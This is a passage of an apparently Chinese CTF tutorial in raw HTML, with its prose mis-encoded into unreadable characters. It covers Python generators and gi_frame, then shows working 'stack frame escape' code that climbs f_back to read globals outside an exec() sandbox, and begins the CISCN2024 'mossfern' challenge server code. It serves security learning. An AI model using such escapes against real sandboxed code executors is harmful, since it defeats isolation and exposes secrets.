class="comment">#ç”Ÿæˆå™¨å‡½æ•°ç¬¬ä¸‰æ¬¡æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>â€‹æˆ–è€…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">f = f()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(f))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(f))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œç»“æœ</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"><span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹Ÿå¯ä»¥ éå†è·å–æ‰€æœ‰çš„è‡ªå¢å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">f = f()</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line"><span class="comment">#ä¼šæ­£å¸¸è¾“å‡º1åˆ°19</span></span><br></pre></td></tr></table></figure><h2 id="2-ç”Ÿæˆå™¨è¡¨è¾¾å¼"><a class="markdownIt-Anchor" href="#2-ç”Ÿæˆå™¨è¡¨è¾¾å¼">#</a> 2ã€ç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼š</h2><p>â€‹ç”Ÿæˆå™¨è¡¨è¾¾å¼æ˜¯ä¸€ç§åœ¨ Python ä¸­åˆ›å»ºç”Ÿæˆå™¨çš„ç´§å‡‘å½¢å¼ã€‚ç±»ä¼¼äºåˆ—è¡¨æ¨å¯¼å¼ï¼Œç”Ÿæˆå™¨è¡¨è¾¾å¼å…è®¸ä½ ä½¿ç”¨ç®€æ´çš„è¯­æ³•æ¥å®šä¹‰ç”Ÿæˆå™¨ï¼Œè€Œä¸å¿…æ˜¾ç¤ºåœ°ç¼–å†™ä¸€ä¸ªå‡½æ•°ã€‚ç”Ÿæˆå™¨è¡¨è¾¾å¼çš„ è¯­æ³•ä¸åˆ—è¡¨æ¨å¯¼å¼ç±»ä¼¼ï¼Œä½†æ˜¯ä½¿ç”¨åœ†æ‹¬å·è€Œä¸æ˜¯æ–¹æ‹¬å·ã€‚ç”Ÿæˆå™¨è¡¨è¾¾å¼ä¼š é€ä¸ªç”Ÿæˆå€¼ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§ç”Ÿæˆ æ•´ä¸ªåºåˆ—ã€‚ã€‚è¿™æœ‰åˆ©äº æé«˜å†…å­˜çš„é¢ åˆ©ç”¨ç‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = (i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯ä»¥ç”¨nextä¸€æ­¥æ­¥ è·å–å€¼</span></span><br><span class="line"><span class="comment"># print(next(f))</span></span><br><span class="line"><span class="comment">#ä¹Ÿå¯ä»¥éå†è·å–æ‰€æœ‰å€¼</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure><h2 id="3-ç”Ÿæˆå™¨å±æ€§"><a class="markdownIt-Anchor" href="#3-ç”Ÿæˆå™¨å±æ€§">#</a> 3ã€ç”Ÿæˆå™¨å±æ€§ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gi_code:ç”Ÿæˆå™¨å¯¹åº”çš„codeå¯¹è±¡ã€‚</span><br><span class="line">gi_frame:ç”Ÿæˆå™¨å¯¹åº”çš„frame(æ ˆå¸§)å¯¹è±¡</span><br><span class="line">gi_running:ç”Ÿæˆå™¨å‡½æ•°æ˜¯å¦åœ¨æ‰§è¡Œã€‚ç”Ÿæˆå™¨å‡½æ•°åœ¨<span class="keyword">yield</span>ä»¥åã€æ‰§è¡Œ<span class="keyword">yield</span>çš„ä¸‹ä¸€è¡Œä»£ç å‰å¤„äºfrozençŠ¶æ€ï¼Œæ­¤æ—¶è¿™ä¸ªå±æ€§ä¸º<span class="number">0.</span></span><br><span class="line">gi_yeildfrom:å¦‚æœç”Ÿæˆå™¨æ­£åœ¨ä»å¦ä¸€ä¸ªç”Ÿæˆå™¨ä¸­<span class="keyword">yield</span>å€¼ï¼Œåˆ™ä¸ºè¯¥ç”Ÿæˆå™¨å¯¹è±¡çš„å¼•ï¼›å¦åˆ™ä¸º<span class="literal">None</span></span><br><span class="line">gi_frame.f_locals:ä¸€ä¸ªå­—å…¸ï¼Œï¼ŒåŒ…å«ç”Ÿæˆå™¨å½“å‰æ ˆçš„æœ¬åœ°å˜é‡</span><br></pre></td></tr></table></figure><h2 id="4-gi_frameçš„ä½¿ç”¨"><a class="markdownIt-Anchor" href="#4-gi_frameçš„ä½¿ç”¨">#</a> 4ã€gi_frame çš„ä½¿ç”¨ï¼š</h2><p>â€‹gi_frame æ˜¯ä¸€ä¸ªä¸ç”Ÿæˆå™¨å’Œåç¨‹ç›¸å…³çš„å±æ€§ã€‚å®ƒæŒ‡å‘ç”Ÿæˆå™¨æˆ–åç¨‹å½“å‰ æ‰§è¡Œçš„å¸§å¯¹è±¡ï¼Œå¦‚æœè¿™ä¸ªç”Ÿæˆå™¨æˆ–åç¨‹æ­£åœ¨æ‰§è¡Œçš„è¯ã€‚å¸§å¯¹è±¡ è¡¨ç¤ºä»£ç  æ‰§è¡Œçš„å½“å‰ä¸Šä¸‹æ–‡ï¼ŒåŒ…å«äº†å±€éƒ¨å˜é‡ã€æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤ç­‰ä¿¡æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">f = f()</span><br><span class="line">frame = f.gi_frame</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å±€éƒ¨å˜é‡(Local Variables):&quot;</span>,frame.f_locals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å…¨å±€å˜é‡(Gloobal Variables):&quot;</span>,frame.f_globals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Codeå¯¹è±¡:&quot;</span>,frame.f_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Insstruction Pointer:&quot;</span>,frame.f_lasti)</span><br></pre></td></tr></table></figure><p>â€‹è·å–ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç”Ÿæˆå™¨çš„å½“å‰ä»£ç ä¿¡æ¯</span></span><br><span class="line">code = gen.gi_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç”Ÿæˆå™¨çš„å½“å‰ä»£ç ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">print</span>( code.co_name)</span><br><span class="line"><span class="built_in">print</span>(code.co_code)</span><br><span class="line"><span class="built_in">print</span>( code.co_consts)</span><br><span class="line"><span class="built_in">print</span>(code.co_filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># my_generator</span></span><br><span class="line"><span class="comment"># b&#x27;K\x00\x01\x00\x97\x00d\x01V\x00\x97\x01\x01\x00d\x02V\x00\x97\x01\x01\x00d\x03V\x00\x97\x01\x01\x00d\x00S\x00&#x27;</span></span><br><span class="line"><span class="comment"># (None, 1, 2, 3)</span></span><br><span class="line"><span class="comment"># C:\Users\20820\PycharmProjects\shizhan\bb.py</span></span><br></pre></td></tr></table></figure><h2 id="5-æ ˆå¸§-frameä»‹ç»"><a class="markdownIt-Anchor" href="#5-æ ˆå¸§-frameä»‹ç»">#</a> 5ã€æ ˆå¸§ (Frame) ä»‹ç»ï¼š</h2><p>â€‹åœ¨ Python ä¸­ï¼Œæ ˆå¸§ï¼ˆstack frameï¼‰ï¼Œä¹Ÿç§°ä¸ºå¸§ï¼ˆframeï¼‰ï¼Œæ˜¯ç”¨äºæ‰§è¡Œä»£ç çš„æ•°æ®ç»“æ„ã€‚æ¯å½“ Python è§£é‡Šå™¨æ‰§è¡Œä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼Œç”¨äºå­˜å‚¨è¯¥å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€å‚æ•°ã€è¿”å›åœ°å€ä»¥åŠå…¶ä»–æ‰§è¡Œç›¸å…³çš„ä¿¡æ¯ã€‚è¿™äº›æ ˆå¸§ä¼šæŒ‰ç…§è°ƒç”¨é¡ºåºè¢«ç»„ç»‡æˆä¸€ä¸ªæ ˆï¼Œç§°ä¸ºè°ƒç”¨æ ˆã€‚</p><p>â€‹æ ˆå¸§åŒ…å«äº†ä»¥ä¸‹å‡ ä¸ªé‡è¦çš„å±æ€§ï¼šf_locals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€‚é”®æ˜¯å˜é‡åã€‚f_globals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚f_code: ä¸€ä¸ªä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ã€‚f_lasti: æ•´æ•°ï¼Œè¡¨ç¤ºæœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ã€‚f_back: æŒ‡å‘ä¸Šä¸€çº§è°ƒç”¨æ ˆå¸§çš„å¼•ç”¨ï¼Œç”¨äºæ„å»ºè°ƒç”¨æ ˆã€‚</p><p>â€‹æ ˆå¸§åŒ…å«äº†ä»¥ä¸‹å‡ ä¸ªé‡è¦çš„å±æ€§ï¼š</p><blockquote><p><code>f_locals</code> : ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€‚é”®æ˜¯å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚<br> <code>f_globals</code> : ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚é”®æ˜¯å…¨å±€å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚<br> <code>f_code</code> : ä¸€ä¸ªä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ã€‚<br> <code>f_lasti</code> : æ•´æ•°ï¼Œè¡¨ç¤ºæœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ã€‚<br> <code>f_back</code> : æŒ‡å‘ä¸Šä¸€çº§è°ƒç”¨æ ˆå¸§çš„å¼•ç”¨ï¼Œç”¨äºæ„å»ºè°ƒç”¨æ ˆã€‚</p></blockquote><h2 id="6-æ ˆå¸§é€ƒé€¸"><a class="markdownIt-Anchor" href="#6-æ ˆå¸§é€ƒé€¸">#</a> 6ã€æ ˆå¸§é€ƒé€¸ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flagï¼šflag&#123;hello_World_hello_Python&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  <span class="comment">#ç”Ÿæˆå™¨</span></span><br><span class="line">    frame = <span class="built_in">next</span>(g) <span class="comment">#è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡</span></span><br><span class="line">    b = frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>] <span class="comment">#è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals</span></span><br><span class="line">    <span class="comment"># b = frame.f_back.f_globals[&#x27;s3cret&#x27;]  # è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">b=waff()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#this is flagï¼šflag&#123;hello_World_hello_Python&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹åœ¨çœ‹çœ‹ä¸Šé¢çš„ <code>f_globals</code> : ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚é”®æ˜¯å…¨å±€å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚</p><p>ä¸éš¾çœ‹å‡ºè¿™é‡Œå‡½æ•°å’Œæ¨¡å—æœ¬å°±åŒåœ¨ä¸€ä¸ªå…¨å±€ï¼Œæ‰€ä»¥éƒ½æœ‰å±æ€§ s3cretï¼Œæ€ä¹ˆçœ‹åˆ°æ²¡åˆ°å…¨å±€ï¼Ÿç›´æ¥çœ‹ file å°±èƒ½çœ‹å‡ºã€‚</p><p>â€‹åœ¨ç»™ä¸ªä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  #ç”Ÿæˆå™¨</span></span><br><span class="line"><span class="string">    frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡</span></span><br><span class="line"><span class="string">    print(frame)</span></span><br><span class="line"><span class="string">    print(frame.f_back)</span></span><br><span class="line"><span class="string">    print(frame.f_back.f_back)</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;frame at 0x0000017C309E7C40, file &#x27;test&#x27;, line 8, code waff&gt;</span></span><br><span class="line"><span class="comment"># &lt;frame at 0x0000017C520AF560, file &#x27;test&#x27;, line 13, code &lt;module&gt;&gt;</span></span><br><span class="line"><span class="comment"># &lt;frame at 0x0000017C521A0040, file &#x27;C:\\Users\\20820\\PycharmProjects\\shizhan\\bb.py&#x27;, line 19, code &lt;module&gt;&gt;</span></span><br><span class="line"><span class="comment"># this is flag</span></span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆï¼Œç”Ÿæˆå™¨çš„æ ˆå¸§æ˜¯ g ï¼Œç»è¿‡ä¸€æ¬¡å›æº¯ ä¹‹ååˆ°äº† waff çš„æ ˆå¸§ï¼Œå†å›æº¯ä¸€æ¬¡ä¹‹ååˆ°äº† exec çš„æ ˆå¸§ï¼Œè¿™ä¸ªæ—¶å€™è®¿é—® <code>f_globals</code>  å°±åˆ°äº† exec å†ä¸Šä¸€å±‚ çš„ä½œç”¨åŸŸï¼Œä¹Ÿå°±æ˜¯å…¨å±€å˜é‡ ã€‚</p><p>â€‹å¦ä¸€ç§æƒ…å†µï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    q = (q.gi_frame.f_back.f_back.f_back.f_globals for _ in [1])</span></span><br><span class="line"><span class="string">    b = [*q][0][&quot;s3cret&quot;]</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure><p>â€‹è¿™æ ·ä¹Ÿèƒ½è¾“å‡º flagï¼Œå’Œä¸Šé¢çš„ç›¸æ¯”ï¼Œæ˜¯è¿›è¡Œäº†ä¸‰æ¬¡å›æº¯ï¼Œå…ˆæ¥ä¸€ä¸ªå›æº¯ç»“æ„ç¤ºæ„ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ä¸»ç¨‹åºå…¨å±€å¸§ (åŒ…å« s3cret)</span><br><span class="line">  â†‘</span><br><span class="line">exec æ‰§è¡Œç¯å¢ƒå¸§</span><br><span class="line">  â†‘</span><br><span class="line">waff() å‡½æ•°è°ƒç”¨å¸§</span><br><span class="line">  â†‘</span><br><span class="line">åˆ—è¡¨æ¨å¯¼å¼å¸§ ([*q] è¿­ä»£è§¦å‘)</span><br><span class="line">  â†‘</span><br><span class="line">ç”Ÿæˆå™¨ q çš„å¸§ (q.gi<span class="built_in">_</span>frame)</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆï¼Œæ˜¯ç”Ÿæˆå™¨ q çš„å¸§ï¼Œå›æº¯ä¸€æ¬¡ä¹‹åæ˜¯ <code>[*q]</code>  è¿™ä¸€è¡Œ çš„å¸§ï¼Œä¹‹åæ‰æ˜¯ waff å’Œ exec çš„å¸§åˆ°äº† exec çš„å¸§ä¹‹åè·å– globals å°±å¯ä»¥è·å¾—åˆ° flag äº†ã€‚</p><p>â€‹ä¸ºä»€ä¹ˆç”¨ <code>[*q]</code>  è¿è¡Œç”Ÿæˆå™¨ï¼Œå´ä¸ç”¨ <code>next(q)</code> ï¼Ÿä¸»è¦æ˜¯å› ä¸ºï¼Œå¤§éƒ¨åˆ†çš„æ²™ç®±é¢˜ç›®ä¸­ï¼Œ <code>builtins</code>  åŸºæœ¬ä¸Šéƒ½è¢«æ¨äº†ï¼Œä¸èƒ½ä½¿ç”¨ next æ¥è¿›è¡Œè·å–ï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨è¿™ç§åŠæ³•ã€‚</p><h2 id="æ¥ä¸ªä¾‹é¢˜ciscn2024-mossfern"><a class="markdownIt-Anchor" href="#æ¥ä¸ªä¾‹é¢˜ciscn2024-mossfern">#</a> æ¥ä¸ªä¾‹é¢˜ (CISCN2024 mossfern)ï¼š</h2><p>â€‹main.py çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span 